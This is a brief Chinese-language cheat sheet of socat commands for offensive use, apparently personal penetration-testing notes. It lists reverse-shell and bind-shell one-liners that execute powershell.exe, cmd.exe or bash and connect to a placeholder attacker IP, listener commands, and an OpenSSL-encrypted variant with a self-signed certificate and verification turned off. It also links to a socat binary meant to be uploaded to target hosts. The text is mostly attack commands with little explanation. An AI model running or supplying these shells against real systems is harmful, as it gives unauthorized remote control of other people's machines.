# Socat

## 介绍

socat 和 netcat 很相似

`自己没实验成功不知道啥原因`

## 反向 SHELL

```shell
$ socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes  # Windows
$ socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"			 # Linux

socat TCP-L:<port> -		# 监听
```

## 绑定 SHELL

```shell
socat TCP-L:<PORT> EXEC:powershell.exe,pipes		# Windows
socat TCP-L:<PORT> EXEC:"bash -li"					# Linux

socat TCP:<TARGET-IP>:<TARGET-PORT> - 				# 连接
```

![img](https://i.imgur.com/etAuYzz.png)

## 稳定

> `此技术仅限于 Linux 目标`
>
> * WIndows 我们可以使用一个 Socat 二进制文件 --> [链接](https://github.com/JTZ-a/netdisc/blob/main/socat)

我们需要将其上传到目标主机上

## 加密

> socat 可以通过证书加密传输内容

```shell
$ openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt	# 生成证书
$ cat shell.key shell.crt > shell.pem

# 交互 SHELL
$ socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -		# 监听
$ socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash	# 目标主机


# 绑定 SHELL
$ socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes  # 目标主机
$ socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -	# 攻击主机
```
